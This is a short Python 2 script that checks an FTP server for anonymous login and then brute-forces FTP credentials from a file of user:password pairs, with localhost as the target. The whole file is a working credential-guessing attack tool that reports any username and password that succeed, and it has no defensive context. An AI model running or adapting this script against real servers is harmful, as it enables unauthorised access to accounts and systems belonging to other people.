#! /usr/bin/python2

import ftplib

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[ * ]  ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'
        ftp.quit()
        return True
    except Exception, e:
        print '\n ' + str(hostname) + ' FTP Anonymous Logon Failed.'
        return False

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip()
        print '[ * ] Trying ' + userName + '/' + passWord
        try:
            ftp = ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[ * ] ' + str(hostname) + ' FTP Logon Succeeded : ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)
        except:
            pass
    print '[ - ] Couldn\'t brute Force FTP credentials'
    return (None, None)

def main():
    host = 'localhost'
    anonLogin(host)

    host = 'localhost'
    passwdFile = 'ftppass.txt'
    bruteLogin(host, passwdFile)

if __name__ == '__main__':
    main()
